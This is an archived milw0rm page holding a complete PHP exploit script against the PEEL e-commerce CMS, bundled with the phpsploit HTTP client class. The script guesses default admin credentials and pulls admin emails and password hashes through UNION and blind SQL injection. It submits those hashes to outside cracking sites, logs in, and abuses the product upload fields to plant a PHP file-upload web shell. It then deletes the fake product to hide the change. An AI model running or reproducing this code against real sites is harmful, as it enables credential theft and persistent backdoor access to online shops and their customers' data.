<html><head><title>PEEL CMS Admin Hash Extraction and Remote Upload Exploit</title></head><pre>#!/usr/bin/php
&lt;?php

/*---------------------------------------------------------------*\
 *
 * Exploit:	PEEL CMS Admin Hash Extraction and Remote Upload
 * Credits:	Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * URL: 	http://realn.free.fr/
 * Date:	03-18-08
 *
 * Targets:	PEEL PREMIUM	PEEL POWERSELL
 *      	PEEL INTEGRALE	PEEL PROFESSIONNELLE
 *
 * This exploit will use multiple vulns of multiple versions
 * of PEEL to try to spawn a Remote Upload File.
 *
 * Special thanks to: ddx39.
 *
\*---------------------------------------------------------------*/

$md5loc = array(
array('http://www.milw0rm.com/cracker/search.php','hash=','&lt;TD align=&quot;middle&quot; nowrap=&quot;nowrap&quot; width=90&gt;([^&lt;]+)&lt;/TD&gt;&lt;TD align=&quot;middle&quot; nowrap=&quot;nowrap&quot; width=90&gt;cracked&lt;/TD&gt;&lt;/TR&gt;'),
array('http://gdataonline.com/qkhash.php?mode=txt&amp;hash=','','&lt;/td&gt;&lt;td width=&quot;35%&quot;&gt;&lt;b&gt;([^&lt;]+)&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;'),
array('http://pepowned.free.fr/?act=&amp;x=52&amp;y=16&amp;md5=','','Le Plain Text de &lt;b&gt;\w{32}&lt;/b&gt; est : &lt;b&gt;([^&lt;]+)&lt;/b&gt;'),
array('http://passcracking.ru/index.php','admin=false&amp;admin2=77.php&amp;datafromuser=','&lt;td&gt;\w{32}&lt;/td&gt;&lt;td bgcolor=\#FF0000&gt;([^&lt;]+)&lt;/td&gt;&lt;td&gt;'),
array('http://md5.rednoize.com/?p&amp;s=md5&amp;_=&amp;q=','','&lt;div id=&quot;result&quot;&gt;([^&lt;]+)&lt;/div&gt;'),
array('http://ice.breaker.free.fr/md5.php?hash=','','&lt;b&gt;&lt;br&gt;&lt;br&gt; - ([^&lt;]+)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=http://ice\.breaker\.free\.fr/'),
);

print &quot;\n&quot;;
print &quot;   PEEL CMS Admin Hash Extraction and Remote Upload\n&quot;;
print &quot;       by Charles \&quot;real\&quot; F. &lt;charlesfol[at]hotmail.fr&gt;\n\n&quot;;

if($argc&lt;2)
{
	print &quot;usage: php peel_exploit.php &lt;url&gt; [options]\n\n&quot;;
	print &quot;Options:\n&quot;;
	print &quot; -admin &lt;login:pass&gt;\tIf you have admin access, you can use this.\n&quot;;
	print &quot;\nexample: php peel_exploit.php http://site.org/boutique/ -admin admin:passw0rd\n&quot;;
	exit();
}

$url = $argv[1];

$xpl = new phpsploit();
$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);

$admin = getparam(&quot;admin&quot;);
if($admin)
{
	print &quot;[*] Using admin login $admin\n&quot;;
	list($login,$r) = explode(&quot;:&quot;,$admin);
	attack($login,$r);
	print &quot;\n&quot;;
}
else
{
	/* --- ATTACK #1: LOGIN GUESSING --- */

	print &quot;[*] Attack #1\n&quot;;
	$default = array( array(&quot;info@peel.fr&quot;,&quot;admin&quot;), array(&quot;contact@peel.fr&quot;,&quot;cinema&quot;) );
	for($i=0;$i&lt;sizeof($default);$i++)
	{
		print &quot;[*] Trying with &quot;.$default[$i][0].&quot;:&quot;.$default[$i][1];
		if(attack($default[$i][0],$default[$i][1])==1) exit();
	}
	print &quot;[*] Attack failed.\n\n&quot;;

	/* --- ATTACK #2: MAGIC_QUOTES_GPC --- */
	
	print &quot;[*] Attack #2\n&quot;;
	print &quot;[*] magic_quotes_gpc=&quot;;
	$c = $xpl-&gt;get($url.&quot;phpinfo.php&quot;);
	if($c &amp;&amp; preg_match('#&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;magic_quotes_gpc&lt;/td&gt;&lt;td class=&quot;v&quot;&gt;([^&lt;]+)&lt;/td&gt;#i',$c,$b))
	{
		print &quot;$b[1]\n&quot;;
	} else print &quot;?\n&quot;;
	if($b[1]!=&quot;On&quot; &amp;&amp; false)
	{
		attack(&quot;'%20OR%20(priv=%27admin%27%20AND%201=1)%20/*&quot;,'hell0');
		if($b[1]==&quot;Off&quot;) exit();
	}
	else print &quot;[*] Attack failed.\n\n&quot;;
	
	/* --- ATTACK #3: SQL INJECTION --- */
	
	print &quot;[*] Attack #3\n&quot;;
	for($i=0;;$i++)
	{
		$c = $xpl-&gt;get($url.&quot;achat/historique_commandes.php?mode=details&amp;id=-1&amp;id_utilisateur=-1&amp;timestamp=%2527%20UNION%20SELECT%20id_utilisateur,2,email,4,5,6,7,8,mot_passe,10,11,12,13,14,15%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1/*&quot;);

		preg_match(&quot;#(\w+@\w+\.\w+)&lt;/a&gt;&lt;/td&gt;#i&quot;,$c,$login);
		preg_match(&quot;#(\w{32})&lt;/td&gt;#i&quot;,$c,$passwd);

		if(count($login)&lt;1)
		{
			if($i==0) print &quot;[*] Attack failed.\n\n&quot;;
			else      print &quot;[*] Attack failed (if you crack a hash, use -admin param).\n\n&quot;;
			break;
		}
		
		$login	= $login[1];
		$passwd	= $passwd[1];
		
		print &quot;[*] Login:\t$login\n&quot;;
		print &quot;[*] Hash:\t$passwd\n&quot;;

		$md5 = strtolower($passwd);
		for($a=0;$a&lt;sizeof($md5loc);$a++)
		{
			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]);
			if($r) { print &quot;[*] Password:\t$r\n&quot;;break; }
		}
		if(!$r) print &quot;[*] Can't find the hash on the net, sorry.\n&quot;;
		else
		{ 
			attack($login,$r);
			die();
		}
	}
	
	/* --- ATTACK #4: BLIND SQL INJECTION --- */
	
	print &quot;[*] Attack #4\n&quot;;
	for($i=0;;$i++)
	{
		$sql = &quot;%2527%20OR%20MID((SELECT%20email%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%200,1),$i,1)=123%20/*&quot;;
		$xpl-&gt;get($url.&quot;factures/facture_html.php?mode=facture&amp;id=1&amp;timestamp=$sql/*&quot;);
		if(!preg_match(&quot;#NO HACK#i&quot;,$xpl-&gt;getcontent()))
		{
			print &quot;[*] Attack failed.\n\n&quot;;
			break;
		}
		
		print &quot;[*] Login:\t&quot;;
		$login	= blind(&quot;email&quot;,$i);
		if($login==&quot;&quot;)
		{
			if($i==0) print &quot;\r[*] Attack failed.\n\n&quot;;
			else      print &quot;\r[*] Attack failed (if you crack a hash, use -admin param).\n\n&quot;;
			break;
		}
		print &quot;\n[*] Hash:\t&quot;;
		$passwd	= blind(&quot;mot_passe&quot;,$i);
		print &quot;\n&quot;;
		$md5 = strtolower($passwd);
		for($a=0;$a&lt;sizeof($md5loc);$a++)
		{
			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]);
			if($r) { print &quot;[*] Password:\t$r\n&quot;;break; }
		}
		if(!$r) print &quot;[*] Can't find the hash on the net, sorry.\n&quot;;
		else
		{ 
			attack($login,$r);
			die();
		}
	}
}

function blind($field,$i=0)
{
	global $xpl,$url;
	$d=0; $v='';
	
	$charset = &quot;etaonisrhldcumfpwgbyvkxjqz0123456789_-\$.^()[]{}Å *\&quot;'@=/\|#?+&amp;!`&lt;&gt;:;,\\&quot;;
	if(eregi('p',$field)) $charset = &quot;0123456789abcdef&quot;;

	while(TRUE)
	{
		$d++;
		for($e=0;$e&lt;strlen($charset);$e++)
		{
			$f=ord(substr($charset,$e,1));
			$sql = &quot;%2527%20OR%20MID((SELECT%20$field%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1),$d,1)=CHAR($f)%20/*&quot;;
			$xpl-&gt;get($url.&quot;factures/facture_html.php?mode=facture&amp;id=1&amp;timestamp=$sql/*&quot;);
			if(!preg_match(&quot;#NO HACK#&quot;,$xpl-&gt;getcontent(),$matches))
			{
				print strtolower(chr($f));
				$v .= chr($f);
				break;
			}
			elseif($e==strlen($charset)-1) return $v;
		}
	}
}

function attack($login,$r)
{
	global $xpl,$url;
	print &quot;\n[*] Login in ... &quot;;
	$xpl-&gt;reset(&quot;cookies&quot;);
	$c=$xpl-&gt;post($url.&quot;/membre.php&quot;,&quot;email=$login&amp;mot_passe=$r&quot;);
	if(!preg_match(&quot;#Location:.*&quot;.$url.&quot;index.php#i&quot;,$c) || !preg_match(&quot;#PHPSESSID=(\w{32})#i&quot;,$c,$sid))
	{ print &quot;failed.\n&quot;;return 0; }
	$sid = $sid[1];
	print &quot;done.\n&quot;;
	print &quot;[*] SID:\t$sid\n&quot;;
	$xpl-&gt;addcookie(&quot;PHPSESSID&quot;,$sid);

	print &quot;\n[*] Adding a fake product ... &quot;;

	$uploadc0de='&lt;?php if(isset($_POST[\'upload\'])) { if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], &quot;./&quot;.$_FILES[\'file\'][\'name\'])) echo(&quot;&lt;center&gt;Error &quot;.$_FILES[\'file\'][\'error\'].&quot;&lt;/center&gt;&quot;);else echo &quot;&lt;center&gt;File uploaded&lt;/center&gt;&quot;; } ?&gt;&lt;?php if(isset($_GET[\'del\'])) unlink(&quot;up.php&quot;); ?&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;center&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Upload&quot;&gt;&lt;/center&gt;&lt;/form&gt;';
	$frmdt	=	array(frmdt_url	  =&gt; $url.&quot;administrer/produits.php?mode=ajout&quot;,
					&quot;mode&quot;		  =&gt; &quot;insere&quot;,
					&quot;id&quot;		  =&gt; &quot;&quot;,
					&quot;categories[]&quot;=&gt; &quot;-1&quot;,
					&quot;reference&quot;	  =&gt; &quot;&quot;,
					&quot;nom&quot;		  =&gt; &quot;hell0&quot;,
					&quot;nom_fr&quot;	  =&gt; &quot;hell0&quot;,
					&quot;nom_en&quot;	  =&gt; &quot;hell0&quot;,
					&quot;prix&quot;		  =&gt; &quot;&quot;,
					&quot;tva&quot;		  =&gt; &quot;19.60&quot;,
					&quot;promotion&quot;   =&gt; &quot;&quot;,
					&quot;references[]&quot;=&gt; &quot;&quot;,
					&quot;descriptif&quot;  =&gt; &quot;&quot;,
					&quot;pformat&quot;	  =&gt; &quot;html&quot;,
					&quot;description&quot; =&gt; &quot;&quot;,
					&quot;mp3&quot;		  =&gt; &quot;&quot;,
					&quot;extrait&quot;	  =&gt; &quot;&quot;,
					&quot;image1&quot;	  =&gt; array(frmdt_filename	=&gt; &quot;&quot;,
								     frmdt_type		=&gt; &quot;application/octet-stream&quot;,
								     frmdt_content	=&gt; &quot;&quot;),
					&quot;image2&quot;	  =&gt; array(frmdt_filename	=&gt; &quot;&quot;,
										   frmdt_type		=&gt; &quot;application/octet-stream&quot;,
										   frmdt_content	=&gt; &quot;&quot;),
					&quot;image3&quot;	  =&gt; array(frmdt_filename	=&gt; &quot;file.php&quot;,
										   frmdt_type		=&gt; &quot;image/gif&quot;,
										   frmdt_content	=&gt; &quot;$uploadc0de&quot;),
					&quot;image4&quot;	  =&gt; array(frmdt_filename	=&gt; &quot;&quot;,
										   frmdt_type		=&gt; &quot;application/octet-stream&quot;,
										   frmdt_content	=&gt; &quot;&quot;),
					&quot;pdf&quot;		  =&gt; array(frmdt_filename	=&gt; &quot;file.php&quot;,
										   frmdt_type		=&gt; &quot;application/pdf&quot;,
										   frmdt_content	=&gt; &quot;$uploadc0de&quot;),
					);

	$c = $xpl-&gt;formdata($frmdt);

	if(!preg_match(&quot;#([0-9]+)(&amp;page=[0-9]+)?\&quot;[^&lt;]*&gt;(&lt;[^&lt;]+&gt;)?hell0(&lt;[^&lt;]+&gt;)?&lt;/a&gt;#i&quot;,$c,$id))
	{ print &quot;failed.\n&quot;;return 0; }

	$id = $id[1];
	print &quot;done.\n&quot;;
	print &quot;[*] Article ID:\t$id\n&quot;;
	
	print &quot;[*] Uploading uploader ... &quot;;
	$c = $xpl-&gt;get($url.&quot;administrer/produits.php?mode=modif&amp;id=$id&quot;);
	if(!preg_match(&quot;#((administrer/)?upload/)([a-z._-]+_[0-9]{6}_[0-9]{6}|[0-9]{6}_[0-9]{6}_PEEL_\w{6})\.php#i&quot;,$c,$file)) print &quot;failed (can't find file).\n&quot;;
	else
	{
		$frmdt =  array(frmdt_url=&gt;$url.$file[0],&quot;upload&quot;=&gt;1,&quot;file&quot;=&gt; array(frmdt_filename=&gt;&quot;up.php&quot;,frmdt_type=&gt;&quot;text/plain&quot;,frmdt_content=&gt;&quot;$uploadc0de&quot;));
		if(preg_match(&quot;#Uploaded#i&quot;,$xpl-&gt;formdata($frmdt))) print &quot;done.\n&quot;;
		else print &quot;failed (can't upload file).\n&quot;;
	}
	
	print &quot;[*] Deleting the fake product ... &quot;;
	$xpl-&gt;get($url.&quot;administrer/produits.php?mode=suppr&amp;id=$id&quot;);
	print &quot;done.\n&quot;;
	
	if(sizeof($file)&gt;0)
	{
		$path = $file[1];
		print &quot;\n[*] Uploader: &quot;.$url.$path.&quot;up.php\n&quot;;
	}
	
	return 1;
}

function crack($url,$post,$gex)
{
	global $xpl,$md5;
	if($post!=''&amp;&amp;preg_match(&quot;#$gex#&quot;,$xpl-&gt;post(&quot;$url&quot;,&quot;$post$md5&quot;),$res)) return $res[1];
	elseif(preg_match(&quot;#$gex#&quot;,$xpl-&gt;get(&quot;$url$md5&quot;),$res)) return $res[1];
	return 0;
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value =&gt; $key)
	{
		if($key == '-'.$param) return $argv[$value+1];
	}
	if($opt) exit(&quot;\n-$param parameter required&quot;);
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don't have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this-&gt;recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport))
		   $socket = @fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else
		   $socket = @fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket)
		   die(&quot;Error: Host seems down&quot;);
		
		if($this-&gt;method=='get')
		   $this-&gt;packet = 'GET '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		   
		elseif($this-&gt;method=='post' or $this-&gt;method=='formdata')
		   $this-&gt;packet = 'POST '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		   
		else
		   die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser))
		   $this-&gt;packet .= 'Proxy-Authorization: Basic '.base64_encode($this-&gt;proxyuser.':'.$this-&gt;proxypass).&quot;\r\n&quot;;
		
		if(!empty($this-&gt;header))
		   $this-&gt;packet .= $this-&gt;showheader();
		   
		if(!empty($this-&gt;cookie))
		   $this-&gt;packet .= 'Cookie: '.$this-&gt;showcookie().&quot;\r\n&quot;;
	
		$this-&gt;packet .= 'Host: '.$this-&gt;host.&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		
		if($this-&gt;method=='post')
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= 'Content-Length: '.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		elseif($this-&gt;method=='formdata')
		{
			$this-&gt;packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this-&gt;boundary.&quot;\r\n&quot;;
			$this-&gt;packet .= 'Content-Length: '.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data;
		}

		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = '';

		fputs($socket,$this-&gt;packet);

		while(!feof($socket))
		   $this-&gt;recv .= fgets($socket);

		fclose($socket);

		if($this-&gt;cookiejar)
		   $this-&gt;getcookie();

		if($this-&gt;allowredirection)
		   return $this-&gt;getredirection();
		else
		   return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this-&gt;addcookie('name','value')
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this-&gt;cookie))
		   $this-&gt;cookie = array();

		$this-&gt;cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this-&gt;addheader('Client-IP', '128.5.2.3')
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this-&gt;header))
		   $this-&gt;header = array();
		   
		$this-&gt;header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this-&gt;proxy('localhost',8118)
	 * @example $this-&gt;proxy('localhost:8118')
	 * 
	 */
	function proxy($proxy,$proxyp='')
	{
		if(empty($proxyp))
		{
			$proxarr = explode(':',$proxy);
			$this-&gt;proxyhost = $proxarr[0];
			$this-&gt;proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this-&gt;proxyhost = $proxy;
			$this-&gt;proxyport = (int)$proxyp;
		}

		if($this-&gt;proxyport &gt; 65535)
		   die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this-&gt;proxyauth('user','pwd')
	 * @example $this-&gt;proxyauth('user:pwd');
	 * 
	 */
	function proxyauth($proxyauth,$proxypass='')
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,':');
			$this-&gt;proxyuser = substr($proxyauth,0,$posvirg);
			$this-&gt;proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this-&gt;proxyuser = $proxyauth;
			$this-&gt;proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the 'User-Agent' header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this-&gt;agent('Firefox')
	 * 
	 */
	function agent($useragent)
	{
		$this-&gt;addheader('User-Agent',$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;header_str Headers
	 * @example $this-&gt;showheader()
	 * 
	 */
	function showheader()
	{
		$this-&gt;header_str = '';
		
		if(!isset($this-&gt;header))
		   return;
		   
		foreach($this-&gt;header as $name =&gt; $value)
		   $this-&gt;header_str .= $name.': '.$value.&quot;\r\n&quot;;
		   
		return $this-&gt;header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;cookie_str Cookies
	 * @example $this-&gt;showcookie()
	 * 
	 */
	function showcookie()
	{
		$this-&gt;cookie_str = '';
		
		if(!isset($this-&gt;cookie))
		   return;
		
		foreach($this-&gt;cookie as $name =&gt; $value)
		   $this-&gt;cookie_str .= $name.'='.$value.'; ';

		return $this-&gt;cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;packet HttpPacket
	 * @example $this-&gt;showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this-&gt;packet))
		   return;
		else
		   return $this-&gt;packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this-&gt;sock()
	 * @example $this-&gt;get('localhost/index.php?var=x')
	 * @example $this-&gt;get('http://localhost:88/tst.php')
	 * 
	 */
	function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method = 'get';
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this-&gt;sock()
	 * @example $this-&gt;post('http://localhost/','helo=x')
	 * 
	 */	
	function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method = 'post';
		$this-&gt;data = $data;
		return $this-&gt;sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this-&gt;sock()
	 * @example $formdata = array(
	 *                      frmdt_url =&gt; 'http://localhost/upload.php',
	 *                      frmdt_boundary =&gt; '123456', # Optional
	 *                      'var' =&gt; 'example',
	 *                      'file' =&gt; array(
	 *                                frmdt_type =&gt; 'image/gif',  # Optional
	 *                                frmdt_transfert =&gt; 'binary' # Optional
	 *                                frmdt_filename =&gt; 'hello.php,
	 *                                frmdt_content =&gt; '&lt;?php echo 1; ?&gt;'));
	 *          $this-&gt;formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this-&gt;target($array[frmdt_url]);
		$this-&gt;method = 'formdata';
		$this-&gt;data = '';
		
		if(!isset($array[frmdt_boundary]))
		   $this-&gt;boundary = 'phpsploit';
		else
		   $this-&gt;boundary = $array[frmdt_boundary];

		foreach($array as $key =&gt; $value)
		{
			if(!preg_match('#^frmdt_(boundary|url)#',$key))
			{
				$this-&gt;data .= str_repeat('-',29).$this-&gt;boundary.&quot;\r\n&quot;;
				$this-&gt;data .= 'Content-Disposition: form-data; name=&quot;'.$key.'&quot;;';
				
				if(!is_array($value))
				{
					$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;
				}
				else
				{
					$this-&gt;data .= ' filename=&quot;'.$array[$key][frmdt_filename].&quot;\&quot;;\r\n&quot;;

					if(isset($array[$key][frmdt_type]))
					   $this-&gt;data .= 'Content-Type: '.$array[$key][frmdt_type].&quot;\r\n&quot;;

					if(isset($array[$key][frmdt_transfert]))
					   $this-&gt;data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert].&quot;\r\n&quot;;

					$this-&gt;data .= &quot;\r\n&quot;.$array[$key][frmdt_content].&quot;\r\n&quot;;
				}
			}
		}

		$this-&gt;data .= str_repeat('-',29).$this-&gt;boundary.&quot;--\r\n&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this-&gt;server_content
	 * @example $this-&gt;getcontent()
	 * @example $this-&gt;getcontent($this-&gt;get('http://localhost/'))
	 * 
	 */
	function getcontent($code='')
	{
		if(empty($code))
		   $code = $this-&gt;recv;

		$code = explode(&quot;\r\n\r\n&quot;,$code);
		$this-&gt;server_content = '';
		
		for($i=1;$i&lt;count($code);$i++)
		   $this-&gt;server_content .= $code[$i];

		return $this-&gt;server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this-&gt;server_header
	 * @example $this-&gt;getcontent()
	 * @example $this-&gt;getcontent($this-&gt;post('http://localhost/','1=2'))
	 * 
	 */
	function getheader($code='')
	{
		if(empty($code))
		   $code = $this-&gt;recv;

		$code = explode(&quot;\r\n\r\n&quot;,$code);
		$this-&gt;server_header = $code[0];
		
		return $this-&gt;server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the &quot;Set-Cookie&quot; header
	 * in the &quot;Cookie&quot; header for the
	 * next request. You don't have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode(&quot;\r\n&quot;,$this-&gt;getheader()) as $header)
		{
			if(preg_match('/set-cookie/i',$header))
			{
				$fequal = strpos($header,'=');
				$fvirgu = strpos($header,';');
				
				// 12=strlen('set-cookie: ')
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this-&gt;cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don't have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this-&gt;target('http://localhost/')
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg('^http://',$urltarg))
		   $urltarg = 'http://'.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this-&gt;url  = 'http://'.$urlarr['host'].$urlarr['path'];
		
		if(isset($urlarr['query']))
		   $this-&gt;url .= '?'.$urlarr['query'];
		
		$this-&gt;port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
		$this-&gt;host = $urlarr['host'];
		
		if($this-&gt;port != '80')
		   $this-&gt;host .= ':'.$this-&gt;port;

		if(!isset($urlarr['path']) or empty($urlarr['path']))
		   die(&quot;Error: No path precised&quot;);

		$this-&gt;path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);

		if($this-&gt;port &gt; 65535)
		   die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * 'Set-Cookie' headers values
	 * and it will automatically add
	 * them into the 'Cookie' header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this-&gt;cookiejar(0)
	 * @example $this-&gt;cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code=='0')
		   $this-&gt;cookiejar=FALSE;

		elseif($code=='1')
		   $this-&gt;cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this-&gt;allowredirection(0)
	 * @example $this-&gt;allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code=='0')
		   $this-&gt;allowredirection=FALSE;
		   
		elseif($code=='1')
		   $this-&gt;allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don't have to call it.
	 *
	 * @access private
	 * @return string $this-&gt;get('http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection)
	 * @return string $this-&gt;get($this-&gt;last_redirection)
	 * @return string $this-&gt;recv;
	 * 
	 */
	function getredirection()
	{
		if(preg_match('/(location|content-location|uri): (.*)/i',$this-&gt;getheader(),$codearr))
		{
			$this-&gt;last_redirection = trim($codearr[2]);
			
			if(!ereg('://',$this-&gt;last_redirection))
			   return $this-&gt;get('http://'.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection);

			else
			   return $this-&gt;get($this-&gt;last_redirection);
		}
		else
		   return $this-&gt;recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this-&gt;reset('header')
	 * @example $this-&gt;reset('cookie')
	 * @example $this-&gt;reset()
	 * 
	 */
	function reset($func='')
	{
		switch($func)
		{
			case 'header':
			$this-&gt;header = array('');
			break;
				
			case 'cookie':
			$this-&gt;cookie = array('');
			break;
				
			default:
			$this-&gt;cookiejar = '';
			$this-&gt;header = array('');
			$this-&gt;cookie = array('');
			$this-&gt;allowredirection = '';
			break;
		}
	}
}

?&gt;

# milw0rm.com [2008-03-19]</pre></html>